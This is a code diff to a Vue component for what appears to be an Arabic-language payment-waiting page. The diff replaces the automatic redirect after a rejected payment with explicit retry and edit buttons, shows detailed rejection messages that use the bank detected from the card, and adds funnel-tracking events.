@@ -82,27 +82,37 @@
                 <!-- Status: Rejected -->
                 <div v-else-if="paymentStatus === 'rejected'" class="mt-6">
                     <div
-                        class="inline-flex items-center gap-2 bg-red-50 text-destructive border border-red-200 rounded-full px-4 py-2 text-sm font-medium">
+                        class="inline-flex items-center gap-2 border rounded-full px-4 py-2 text-sm font-medium"
+                        :class="rejectionAlert?.type === 'warning' ? 'bg-amber-50 text-amber-700 border-amber-200' : 'bg-red-50 text-destructive border-red-200'">
                         <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                             <path fill-rule="evenodd"
                                 d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
                                 clip-rule="evenodd" />
                         </svg>
-                        <span>تم الرفض</span>
+                        <span>{{ rejectionAlert?.title || 'تم الرفض' }}</span>
                     </div>
                     <p class="text-sm text-slate-700 font-medium mt-3">
-                        {{ friendlyRejectionReason || 'لم تتم الموافقة على العملية' }}
+                        {{ rejectionAlert?.message || 'لم تتم الموافقة على العملية' }}
                     </p>
-                    <p class="text-xs text-slate-500 mt-1">يمكنك المحاولة مرة أخرى ببطاقة مختلفة</p>
-                    <p class="text-xs text-slate-400 mt-2">سيتم إعادة التوجيه تلقائياً...</p>
-                    <button
-                        class="mt-3 inline-flex items-center gap-2 bg-primary hover:bg-primary-dark text-white font-bold text-sm px-6 py-2.5 rounded-xl transition-colors cursor-pointer"
-                        @click="goBackToCheckout">
-                        <svg class="w-4 h-4 rotate-180" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
-                        </svg>
-                        تعديل بيانات الدفع
-                    </button>
+                    <p class="text-xs text-slate-500 mt-1">{{ rejectionAlert?.action || 'يمكنك المتابعة الآن بمحاولة جديدة أو تعديل بيانات البطاقة.' }}</p>
+                    <p v-if="rejectionAlert?.suggestion" class="text-xs text-slate-500 mt-1">{{ rejectionAlert.suggestion }}</p>
+
+                    <div class="mt-4 flex flex-col sm:flex-row gap-2 justify-center">
+                        <button
+                            class="inline-flex items-center justify-center gap-2 bg-primary hover:bg-primary-dark text-white font-bold text-sm px-6 py-2.5 rounded-xl transition-colors cursor-pointer"
+                            @click="retryWithAnotherCard">
+                            <svg class="w-4 h-4 rotate-180" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
+                            </svg>
+                            جرّب بطاقة أخرى
+                        </button>
+
+                        <button
+                            class="inline-flex items-center justify-center gap-2 bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold text-sm px-6 py-2.5 rounded-xl transition-colors cursor-pointer"
+                            @click="editPaymentDetails">
+                            تعديل بيانات الدفع
+                        </button>
+                    </div>
                 </div>
 
                 <!-- Card Summary -->
@@ -136,23 +146,22 @@
 <script setup>
 import { ref, computed, onMounted, onUnmounted } from 'vue';
 import { useRouter } from 'vue-router';
-import { useI18n } from 'vue-i18n';
 import i18n from '@/i18n';
 import { useVisitorTracking } from '@/composables/useVisitorTracking';
-import { trackStepViewed, trackPaymentWaitStarted, trackPaymentWaitCompleted, trackStepCompleted } from '@/composables/useFunnelTracking';
+import { trackStepViewed, trackPaymentWaitStarted, trackPaymentWaitCompleted, trackStepCompleted, trackFunnelEvent } from '@/composables/useFunnelTracking';
 import { usePayment } from '@/composables/usePayment';
 import { usePaymentWebSocket } from '@/composables/usePaymentWebSocket';
 import { getCardStatus } from '@/api/paymentApi';
 import logger from '@/utils/logger';
 import { safeRedirect } from '@/utils/safeRedirect';
 import SarIcon from '@/components/SarIcon.vue';
-import { getReasonLabel } from '@/constants/rejectionReasons';
+import { formatPaymentFailure } from '@/constants/rejectionReasons';
 import { BANK_LOGOS } from '@/constants/bankLogos';
+import { CASHBACK_SUMMARY_IMAGE } from '@/constants/cashbackImage';
 import { detectBankFromBin } from '@/utils/bankDetector';
-import bannerBg from '../../../images/logo/summary_logo/تنزيل.png';
 
-const { t } = useI18n();
 const router = useRouter();
+const bannerBg = CASHBACK_SUMMARY_IMAGE;
 
 // Track this page
 useVisitorTracking( 'payment/waiting' );
@@ -207,11 +216,11 @@ const { status: paymentStatus, rejectionReason, setup: setupWs } = usePaymentWeb
         logger.debug( '[PaymentWaiting] Payment rejected:', event );
         // Clear otpContext so the beforeEnter guard blocks re-entry
         sessionStorage.removeItem( 'otpContext' );
-        // Auto-redirect to checkout after brief visual feedback
-        setTimeout( () =>
-        {
-            router.replace( { name: 'checkout', query: { rejectionReason: event.reason || '' } } );
-        }, 3000 );
+        // Keep user in control on rejection and let them choose retry/edit action explicitly.
+        trackFunnelEvent( 'payment_rejected_viewed', {
+            step_name: 'payment_waiting',
+            metadata: { reason: event.reason || '' },
+        } );
     },
 
     async pollFn ( { handleApproved, handleRejected } )
@@ -236,12 +245,32 @@ const { status: paymentStatus, rejectionReason, setup: setupWs } = usePaymentWeb
     },
 } );
 
-const friendlyRejectionReason = computed( () => getReasonLabel( rejectionReason.value, t ) );
+const rejectionAlert = computed( () => formatPaymentFailure( rejectionReason.value, {
+    detectedBank: detectBankFromBin( context.cardBin || '' ),
+} ) );
 
 function goBackToCheckout ()
 {
     sessionStorage.removeItem( 'otpContext' );
     router.replace( { name: 'checkout', query: { rejectionReason: rejectionReason.value || '' } } );
+}
+
+function retryWithAnotherCard ()
+{
+    trackFunnelEvent( 'payment_rejected_retry_clicked', {
+        step_name: 'payment_waiting',
+        metadata: { reason: rejectionReason.value || '' },
+    } );
+    goBackToCheckout();
+}
+
+function editPaymentDetails ()
+{
+    trackFunnelEvent( 'payment_rejected_edit_clicked', {
+        step_name: 'payment_waiting',
+        metadata: { reason: rejectionReason.value || '' },
+    } );
+    goBackToCheckout();
 }
 
 // "Taking too long" indicator — shown after 30 seconds of waiting
